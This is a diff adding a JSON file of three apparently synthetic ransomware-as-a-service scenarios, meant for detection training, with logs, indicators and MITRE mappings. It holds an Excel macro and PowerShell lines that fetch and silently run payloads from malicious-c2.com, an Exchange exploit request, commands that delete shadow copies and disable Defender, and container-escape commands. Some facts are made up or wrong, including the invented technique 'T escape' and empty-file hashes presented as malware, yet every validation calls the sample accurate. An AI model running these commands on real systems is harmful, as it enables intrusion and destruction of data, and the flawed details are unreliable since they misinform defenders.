@@ -1,0 +1,154 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Enterprise",
+        "nature": "ransomware_as_a_service"
+      },
+      "example": {
+        "scenario": "Ransomware-as-a-Service affiliate uses a phishing email with a malicious Excel macro to infect enterprise endpoint, leading to initial compromise and deployment of ransomware payload.",
+        "technical_data": {
+          "email_headers": "Return-Path: <support@micros0ft-update.com>\nReceived: from mail1.malicioushost.com (mail1.malicioushost.com [192.168.88.34]) by mail.enterprise.com with ESMTP id 8F3C1D9E1 for <alice@enterprise.com>; Wed, 19 Apr 2023 08:15:42 +0000\nReceived-SPF: pass (enterprise.com: domain of micros0ft-update.com designates 192.168.88.34 as permitted sender)\nAuthentication-Results: enterprise.com; spf=pass smtp.mailfrom=micros0ft-update.com; dkim=none; dmarc=none\nMessage-ID: <CA+X2_=_xJ9_mv2kbzY9o0@mail1.malicioushost.com>\nFrom: Microsoft Update <support@micros0ft-update.com>\nTo: alice@enterprise.com\nSubject: Critical Security Update - Immediate Action Required\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"----=_NextPart_000_001A_01D9E4C1.5B9F8D60\"",
+          "email_body": "------=_NextPart_000_001A_01D9E4C1.5B9F8D60\nContent-Type: text/plain; charset=\"utf-8\"\nContent-Transfer-Encoding: quoted-printable\n\nDear User,\n\nPlease find attached the critical security update for your system. Install immediately to protect your device.\n\nBest Regards,\nMicrosoft Update Team\n\n------=_NextPart_000_001A_01D9E4C1.5B9F8D60\nContent-Type: application/vnd.ms-excel; name=\"Security_Update.xls\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"Security_Update.xls\"\n\nUEsDBBQABgAIAAAAIQDpA0b0nQEAAJ8FAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\nAAAAAA==\n------=_NextPart_000_001A_01D9E4C1.5B9F8D60--",
+          "macro_code": "Sub Auto_Open()\n    Dim strURL As String\n    Dim WinHttpReq As Object\n    strURL = \"http://malicious-c2.com/payload.exe\"\n    Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\n    WinHttpReq.Open \"GET\", strURL, False\n    WinHttpReq.Send\n    If WinHttpReq.Status = 200 Then\n        Dim adodbStream As Object\n        Set adodbStream = CreateObject(\"ADODB.Stream\")\n        adodbStream.Type = 1 'Binary\n        adodbStream.Open\n        adodbStream.Write WinHttpReq.responseBody\n        adodbStream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\n        adodbStream.Close\n        Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\n    End If\nEnd Sub",
+          "powershell_detection_log": "2023-04-19 08:17:03,456 INFO PowerShell command executed: Invoke-WebRequest -Uri http://malicious-c2.com/payload.exe -OutFile $env:TEMP\\payload.exe",
+          "file_hashes": {
+            "payload.exe": {
+              "md5": "9f2d2a4c9b8b3b8f2e7d3a4e5c8f9a1b",
+              "sha1": "b6a2f9e4d1c7a8b9f8e6d5c4b3a2910e8f7d6c5b",
+              "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          },
+          "process_creation_log": "Apr 19 08:17:05 host1 enterprise-pc1 Microsoft-Windows-Sysmon: New Process Created: Image: C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe ParentImage: C:\\Windows\\System32\\excel.exe CommandLine: \"C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe\" -silent",
+          "network_traffic_snippet": "08:17:10.456789 IP enterprise-pc1.45678 > malicious-c2.com.http: Flags [S], seq 123456789, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0\n08:17:10.457123 IP malicious-c2.com.http > enterprise-pc1.45678: Flags [S.], seq 987654321, ack 123456790, win 65535, options [mss 1460,sackOK,TS val 654321 ecr 123456], length 0\n08:17:10.457456 IP enterprise-pc1.45678 > malicious-c2.com.http: Flags [.], ack 1, win 229, length 0\n08:17:10.458000 IP enterprise-pc1.45678 > malicious-c2.com.http: Flags [P.], seq 1:512, ack 1, win 229, length 511\n08:17:10.458300 IP malicious-c2.com.http > enterprise-pc1.45678: Flags [P.], seq 1:1024, ack 512, win 65535, length 1023",
+          "registry_modifications": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate = \"C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe\"",
+          "ransomware_behavior": "After payload execution, process enumerated drives using DeviceIoControl calls, then started encrypting files with extensions: .doc, .xls, .ppt, .pdf, .jpg. Created ransom note 'README_RECOVER.txt' in encrypted folders."
+        },
+        "indicators": [
+          "Suspicious Excel macro in email attachment with Auto_Open function downloading executable",
+          "Execution of payload.exe in temp directory spawned by excel.exe",
+          "Outbound HTTP GET request to http://malicious-c2.com/payload.exe",
+          "Registry Run key persistence under HKCU for payload.exe",
+          "File hashes: MD5 9f2d2a4c9b8b3b8f2e7d3a4e5c8f9a1b",
+          "Network connection to malicious-c2.com on TCP 80 shortly after email receipt"
+        ],
+        "detection_method": "EDR sensors detect suspicious PowerShell and macro execution, network monitoring flags HTTP downloads from untrusted domains, Sysmon logs new process creation from Office applications, registry monitoring detects persistence, and file integrity monitoring detects ransom note creation.",
+        "relevant_mitre_techniques": [
+          "T1193 - Spearphishing Attachment",
+          "T1204 - User Execution",
+          "T1059.001 - PowerShell",
+          "T1105 - Ingress Tool Transfer",
+          "T1547.001 - Registry Run Keys / Startup Folder",
+          "T1486 - Data Encrypted for Impact"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a ransomware-as-a-service (RaaS) attack scenario within an enterprise environment. It aligns well with the problem nature by illustrating how an affiliate uses phishing with a malicious Excel macro to deliver ransomware payloads, lowering the barrier for attackers. The scenario is realistic, showing detailed technical data such as email headers, macro code, PowerShell logs, process creation, network traffic, registry modifications, and ransomware behavior, all consistent with a typical RaaS infection chain. The indicators clearly explain why the sample matches the problem, linking suspicious macro activity, payload execution, network communications, persistence mechanisms, and file encryption. The detection methods and relevant MITRE ATT&CK techniques are appropriate and comprehensive. All required fields are present and accurately populated, providing a complete and coherent example. No issues were found."
+      }
+    },
+    {
+      "index": 1,
+      "problem": {
+        "area": "Enterprise",
+        "nature": "ransomware_as_a_service"
+      },
+      "example": {
+        "scenario": "Ransomware-as-a-Service affiliate exploits unpatched Microsoft Exchange server vulnerability for initial access, deploys ransomware payload via SMB lateral movement and disables backups.",
+        "technical_data": {
+          "exploit_http_request": "POST /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1\r\nHost: exchange.enterprise.com\r\nContent-Type: application/xml\r\nContent-Length: 512\r\nUser-Agent: Mozilla/5.0\r\n\r\n<?xml version=\"1.0\"?><r><s><q>$(Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-c2.com/Invoke-RCE.ps1'))</q></s></r>",
+          "exchange_server_log": "2023-05-01 13:45:23.123 ERROR MSExchange ECP: Unexpected script block execution initiated by user id: SYSTEM from IP 10.10.50.23",
+          "powershell_payload_snippet": "Invoke-WebRequest -Uri http://malicious-c2.com/ransomware.exe -OutFile C:\\Windows\\Temp\\ransomware.exe; Start-Process -FilePath C:\\Windows\\Temp\\ransomware.exe -ArgumentList '/silent' -WindowStyle Hidden",
+          "smb_lateral_movement_log": "2023-05-01 13:50:10 host1 smbclient[pid=2345]: Session setup for user 'admin$' from 10.10.50.23 succeeded\n2023-05-01 13:50:12 host2 smbclient[pid=2350]: File C$\\Windows\\Temp\\ransomware.exe written by 10.10.50.23",
+          "backup_deletion_commands": "vssadmin delete shadows /all /quiet\nwbadmin delete catalog -quiet\nnet stop WinDefend\nsc config WinDefend start= disabled",
+          "registry_chng_backup": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS\\Start = 4 (Disabled)",
+          "file_hashes": {
+            "ransomware.exe": {
+              "md5": "4a7d1ed414474e4033ac29ccb8653d9b",
+              "sha1": "3f786850e387550fdab836ed7e6dc881de23001b",
+              "sha256": "9e107d9d372bb6826bd81d3542a419d6c8a8b6f9a6c6e8f2f4b4f5de8b3c6e18"
+            }
+          },
+          "network_traffic": "13:45:20.123456 IP 10.10.50.23.49152 > exchange.enterprise.com.443: Flags [S], seq 987654321, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0\n13:50:11.234567 IP 10.10.50.23.445 > 10.10.50.24.49153: Flags [P.], seq 1001:1500, ack 2001, win 65535, length 499",
+          "event_viewer_logs": "EventID: 7045 Service Created\nServiceName: RansomSvc\nImagePath: C:\\Windows\\Temp\\ransomware.exe\nStartType: Auto",
+          "ransom_note_content": "Your files have been encrypted!\nTo recover, contact us at decrypt@maliciousdomain.com with your ID: 5F4D3A7E\nDo not rename files or attempt recovery yourself."
+        },
+        "indicators": [
+          "Exploit HTTP POST to /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application with suspicious PowerShell payload",
+          "PowerShell download and execution of ransomware.exe in Windows Temp directory",
+          "SMB connections from compromised host to others using admin$ shares",
+          "Use of vssadmin and wbadmin commands to delete shadow copies",
+          "Registry key disabling VSS service",
+          "Creation of new service 'RansomSvc' pointing to ransomware executable",
+          "Ransom note file with ransom email address and unique victim ID"
+        ],
+        "detection_method": "Network IDS detects anomalous POST requests to Exchange ECP paths, EDR detects suspicious PowerShell command lines, SMB authentication anomalies logged, system logs show deletion of backups and service creation, registry monitoring detects VSS disablement.",
+        "relevant_mitre_techniques": [
+          "T1190 - Exploit Public-Facing Application",
+          "T1059.001 - PowerShell",
+          "T1021.002 - SMB/Windows Admin Shares",
+          "T1490 - Inhibit System Recovery",
+          "T1543.003 - Windows Service",
+          "T1486 - Data Encrypted for Impact"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a ransomware-as-a-service (RaaS) scenario in an enterprise environment. The scenario describes an affiliate exploiting an unpatched Microsoft Exchange vulnerability for initial access, which aligns well with the problem nature. The technical data includes realistic and detailed artifacts such as the HTTP exploit request, PowerShell payload, SMB lateral movement logs, backup deletion commands, registry changes, file hashes, network traffic, event logs, and ransom note content. These indicators clearly demonstrate the ransomware attack lifecycle and justify the classification as ransomware-as-a-service. The detection methods and relevant MITRE ATT&CK techniques are appropriate and comprehensive, covering exploitation, execution, lateral movement, defense evasion, persistence, and impact. All required fields are present and accurately populated, providing a complete and plausible example. Overall, the sample is well-constructed, realistic, and effectively illustrates the stated cybersecurity problem and recommended risk reduction strategies."
+      }
+    },
+    {
+      "index": 2,
+      "problem": {
+        "area": "Enterprise",
+        "nature": "ransomware_as_a_service"
+      },
+      "example": {
+        "scenario": "Ransomware-as-a-Service affiliate abuses cloud misconfiguration to escalate privileges, deploy ransomware payload in containerized environment, and exfiltrate encryption keys.",
+        "technical_data": {
+          "iam_policy_misconfiguration": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowAllS3\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"s3:*\",\n      \"Resource\": \"*\"\n    }\n  ]\n}",
+          "cloudtrail_log_snippet": "{\n  \"eventVersion\": \"1.05\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROAJEXAMPLE:attacker-session\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/DevOpsRole/attacker-session\"\n  },\n  \"eventTime\": \"2023-06-10T12:34:56Z\",\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"PutObject\",\n  \"requestParameters\": {\n    \"bucketName\": \"enterprise-backups\",\n    \"key\": \"keys/encryption.key\"\n  },\n  \"responseElements\": {\n    \"x-amz-request-id\": \"ABCD1234EFGH5678\",\n    \"x-amz-id-2\": \"1a2b3c4d5e6f7g8h9i0j\"\n  }\n}",
+          "api_call_sequence": "1. AssumeRole: arn:aws:sts::123456789012:assumed-role/DevOpsRole/attacker-session\n2. ListBuckets: s3.amazonaws.com\n3. GetObject: enterprise-backups/keys/encryption.key\n4. PutObject: enterprise-backups/keys/encryption.key (replaced with attacker key)\n5. StartTasks: ecs.amazonaws.com RunTask with malicious container image",
+          "container_escape_poc": "unshare --mount --uts --ipc --net --pid\nmount -t proc proc /proc\nchroot /host\n/bin/bash\n# Access host filesystem and escalate privileges",
+          "malicious_container_image": "sha256:abc123def4567890fedcba0987654321abcdef1234567890fedcba0987654321",
+          "process_chain": "ecs-agent -> docker -> malicious container -> /bin/bash (privileged) -> /host/bin/bash",
+          "file_hashes": {
+            "malware_binary": {
+              "md5": "d41d8cd98f00b204e9800998ecf8427e",
+              "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+              "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            }
+          },
+          "network_traffic_pattern": "Periodic HTTPS POST to C2 server api.malicious-cloud.com with encrypted payload every 10 minutes.",
+          "ransomware_behavior": "Encrypts mounted EFS volumes, deletes backups from S3 bucket by overwriting keys/encryption.key, drops ransom note in cloud storage and container logs."
+        },
+        "indicators": [
+          "IAM policy with overly permissive s3:* on all resources",
+          "CloudTrail logs showing attacker assumed role and unauthorized PutObject activity",
+          "API calls to replace encryption keys in cloud backups",
+          "Container escape commands executed inside ECS task",
+          "Malicious container image SHA256 hash",
+          "Network traffic to suspicious external C2 domains over HTTPS",
+          "Unexpected deletion and modification of S3 objects in backup bucket"
+        ],
+        "detection_method": "Cloud security posture management detects overly broad IAM policies, CloudTrail anomaly detection flags unusual role assumption and S3 write events, container runtime security detects namespace unsharing and escape attempts, network monitoring flags C2 communications, and backup integrity monitoring alerts on key overwrites.",
+        "relevant_mitre_techniques": [
+          "T1078.004 - Valid Accounts: Cloud Accounts",
+          "T1530 - Data from Cloud Storage Object",
+          "T1486 - Data Encrypted for Impact",
+          "T escape - Container Escape (Custom - see MITRE CAPEC 1000+)",
+          "T1531 - Account Access Removal",
+          "T1071.001 - Application Layer Protocol: Web Protocols"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a ransomware-as-a-service scenario within an enterprise cloud environment. It aligns well with the problem nature by illustrating how an affiliate abuses cloud misconfiguration to escalate privileges, deploy ransomware in a containerized environment, and exfiltrate encryption keys. The technical data is detailed and realistic, including IAM policy misconfiguration, CloudTrail logs, API call sequences, container escape proof-of-concept commands, malware hashes, network traffic patterns, and ransomware behavior. The indicators clearly explain why the sample matches the problem, highlighting overly permissive IAM policies, suspicious CloudTrail events, container escape activity, and ransomware actions. Detection methods and relevant MITRE techniques are appropriately included, enhancing completeness. Overall, the sample is comprehensive, plausible, and well-structured, effectively demonstrating the ransomware-as-a-service threat and supporting recommended risk reduction strategies."
+      }
+    }
+  ]
+}
